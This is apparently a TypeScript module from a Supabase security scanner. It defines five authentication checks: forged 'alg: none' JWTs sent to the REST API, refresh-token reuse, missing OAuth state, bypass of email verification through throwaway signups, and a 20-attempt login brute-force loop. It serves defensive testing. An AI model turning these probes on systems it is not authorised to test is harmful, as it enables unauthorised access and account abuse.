/**
 * Advanced Auth Attacks
 * Tests for advanced authentication and session vulnerabilities
 */

import type { AttackVector, AttackContext, AttackResult } from '$lib/types/attacks';

/**
 * Advanced Auth Attack Vectors
 */
export const authAdvancedAttacks: AttackVector[] = [
	{
		id: 'auth-jwt-algorithm-confusion',
		name: 'JWT Algorithm Confusion',
		description: 'Tests if JWT tokens with modified algorithms are accepted',
		category: 'auth',
		severity: 'critical',
		tags: ['auth', 'jwt', 'algorithm'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			// Create a forged JWT with "none" algorithm
			const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' })).replace(/=/g, '');
			const payload = btoa(JSON.stringify({
				sub: '00000000-0000-0000-0000-000000000000',
				role: 'authenticated',
				aud: 'authenticated',
				exp: Math.floor(Date.now() / 1000) + 3600
			})).replace(/=/g, '');

			const forgedTokens = [
				`${header}.${payload}.`, // No signature
				`${header}.${payload}.signature`, // Fake signature
			];

			const accepted: string[] = [];

			for (const token of forgedTokens) {
				try {
					const response = await fetch(`${ctx.targetUrl}/rest/v1/profiles?select=count`, {
						method: 'HEAD',
						headers: {
							apikey: ctx.anonKey,
							Authorization: `Bearer ${token}`
						}
					});

					if (response.ok) {
						accepted.push(token.substring(0, 50) + '...');
					}
				} catch {
					// Continue
				}
			}

			const breached = accepted.length > 0;

			return {
				attackId: 'auth-jwt-algorithm-confusion',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? 'CRITICAL: Forged JWT tokens accepted!'
					: 'JWT algorithm properly enforced',
				details: {},
				evidence: breached ? { acceptedTokens: accepted } : undefined,
				timestamp: new Date().toISOString(),
				duration: 0
			};
		}
	},
	{
		id: 'auth-refresh-token-reuse',
		name: 'Refresh Token Reuse',
		description: 'Tests if refresh tokens can be reused after rotation',
		category: 'auth',
		severity: 'high',
		tags: ['auth', 'refresh-token', 'session'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			// This is a behavioral test - we check the configuration
			try {
				const response = await fetch(`${ctx.targetUrl}/auth/v1/token?grant_type=refresh_token`, {
					method: 'POST',
					headers: {
						apikey: ctx.anonKey,
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						refresh_token: 'old_refresh_token_test'
					})
				});

				const data = await response.json();

				// Check if error message reveals token handling
				const errorMessage = data.error_description || data.error || '';
				const reveals = errorMessage.toLowerCase().includes('expired') ||
					errorMessage.toLowerCase().includes('invalid') ||
					errorMessage.toLowerCase().includes('reuse');

				return {
					attackId: 'auth-refresh-token-reuse',
					status: 'secure', // Can't definitively breach without valid token
					breached: false,
					summary: reveals
						? 'Refresh token rotation appears enabled'
						: 'Unable to determine refresh token policy',
					details: { response: data },
					timestamp: new Date().toISOString(),
					duration: 0
				};
			} catch {
				return {
					attackId: 'auth-refresh-token-reuse',
					status: 'error',
					breached: false,
					summary: 'Could not test refresh token handling',
					details: {},
					timestamp: new Date().toISOString(),
					duration: 0
				};
			}
		}
	},
	{
		id: 'auth-oauth-state',
		name: 'OAuth State Parameter Missing',
		description: 'Tests if OAuth flows properly validate state parameter',
		category: 'auth',
		severity: 'high',
		tags: ['auth', 'oauth', 'csrf'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			const providers = ['google', 'github', 'azure', 'facebook'];
			const vulnerable: string[] = [];

			for (const provider of providers) {
				try {
					// Check if provider is enabled and if state is required
					const response = await fetch(
						`${ctx.targetUrl}/auth/v1/authorize?provider=${provider}`,
						{
							method: 'GET',
							headers: {
								apikey: ctx.anonKey
							},
							redirect: 'manual'
						}
					);

					// If we get a redirect without requiring state, it's vulnerable
					if (response.status === 302 || response.status === 303) {
						const location = response.headers.get('location') || '';
						if (!location.includes('state=')) {
							vulnerable.push(provider);
						}
					}
				} catch {
					// Continue
				}
			}

			const breached = vulnerable.length > 0;

			return {
				attackId: 'auth-oauth-state',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? `${vulnerable.length} OAuth providers missing state parameter`
					: 'OAuth state parameter properly enforced',
				details: {},
				evidence: breached ? { providers: vulnerable } : undefined,
				timestamp: new Date().toISOString(),
				duration: 0
			};
		}
	},
	{
		id: 'auth-email-verification-bypass',
		name: 'Email Verification Bypass',
		description: 'Tests if email verification can be bypassed',
		category: 'auth',
		severity: 'high',
		tags: ['auth', 'email', 'verification'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			try {
				// Try to sign up and immediately access protected resources
				const testEmail = `test_${Date.now()}@supashield-test.com`;

				const signupResponse = await fetch(`${ctx.targetUrl}/auth/v1/signup`, {
					method: 'POST',
					headers: {
						apikey: ctx.anonKey,
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						email: testEmail,
						password: 'TestPassword123!'
					})
				});

				const signupData = await signupResponse.json();

				// Check if we got an access token without email verification
				const hasToken = signupData.access_token || signupData.session?.access_token;

				// If we got a token, try to access protected data
				if (hasToken) {
					const token = signupData.access_token || signupData.session?.access_token;
					const testResponse = await fetch(`${ctx.targetUrl}/rest/v1/profiles?select=*`, {
						headers: {
							apikey: ctx.anonKey,
							Authorization: `Bearer ${token}`
						}
					});

					if (testResponse.ok) {
						return {
							attackId: 'auth-email-verification-bypass',
							status: 'breached',
							breached: true,
							summary: 'Email verification can be bypassed - unverified accounts have access',
							details: {},
							evidence: { hasAccessToken: true, canAccessData: true },
							timestamp: new Date().toISOString(),
							duration: 0
						};
					}
				}

				return {
					attackId: 'auth-email-verification-bypass',
					status: 'secure',
					breached: false,
					summary: 'Email verification properly enforced',
					details: {},
					timestamp: new Date().toISOString(),
					duration: 0
				};
			} catch {
				return {
					attackId: 'auth-email-verification-bypass',
					status: 'error',
					breached: false,
					summary: 'Could not test email verification',
					details: {},
					timestamp: new Date().toISOString(),
					duration: 0
				};
			}
		}
	},
	{
		id: 'auth-rate-limit-login',
		name: 'Login Rate Limiting',
		description: 'Tests if login attempts are rate limited',
		category: 'auth',
		severity: 'high',
		tags: ['auth', 'rate-limit', 'brute-force'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			const attempts = 20;
			let successCount = 0;
			let rateLimited = false;

			for (let i = 0; i < attempts; i++) {
				try {
					const response = await fetch(`${ctx.targetUrl}/auth/v1/token?grant_type=password`, {
						method: 'POST',
						headers: {
							apikey: ctx.anonKey,
							'Content-Type': 'application/json'
						},
						body: JSON.stringify({
							email: 'bruteforce@test.com',
							password: `wrong_password_${i}`
						})
					});

					if (response.status === 429) {
						rateLimited = true;
						break;
					}
					successCount++;
				} catch {
					break;
				}
			}

			const breached = !rateLimited && successCount >= attempts;

			return {
				attackId: 'auth-rate-limit-login',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? `No rate limiting - ${successCount} login attempts allowed`
					: `Rate limiting active after ${successCount} attempts`,
				details: {},
				evidence: { attemptsBeforeBlock: successCount, wasRateLimited: rateLimited },
				timestamp: new Date().toISOString(),
				duration: 0
			};
		}
	}
];
